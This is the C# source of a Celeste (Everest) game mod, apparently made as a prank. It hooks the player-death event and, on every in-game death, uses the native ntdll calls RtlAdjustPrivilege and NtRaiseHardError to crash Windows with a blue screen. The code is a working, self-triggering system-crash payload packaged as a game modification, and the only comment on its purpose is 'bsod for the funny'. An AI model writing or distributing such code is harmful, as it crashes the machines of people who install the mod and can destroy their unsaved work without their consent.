using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using Celeste;
using Celeste.Mod;
using Celeste.Mod.Entities;
using IL.Celeste;
using Microsoft.Xna.Framework;
using Mono.Cecil.Cil;
using Monocle;
using MonoMod.Cil;
using MonoMod.Utils;
using On.Celeste;
using System.Runtime.InteropServices;

namespace lmaoitsabsod
{
    public class Bsodmoment : EverestModule
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        // Only one alive module instance can exist at any given time.
        public static Bsodmoment Instance;

        public Bsodmoment ()
        {
            Instance = this;
        }

        // Set up any hooks, event handlers and your mod in general here.
        // Load runs before Celeste itself has initialized properly.
        //bsod for the funny
        static Celeste.PlayerDeadBody Wherethemagichappens(On.Celeste.Player.orig_Die orig, Celeste.Player self, Vector2 direction, bool evenIfInvincible, bool registerinDeathStats)
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xDEADDEAD, 0, 0, IntPtr.Zero, 6, out t2);
            return orig(self, direction, evenIfInvincible, registerinDeathStats);
        }

        public override void Load()
        {
            On.Celeste.Player.Die += Wherethemagichappens;
        }

        // Unload the entirety of your mod's content. Free up any native resources.
        public override void Unload()
        {
            On.Celeste.Player.Die -= Wherethemagichappens;
        }

        

    }
}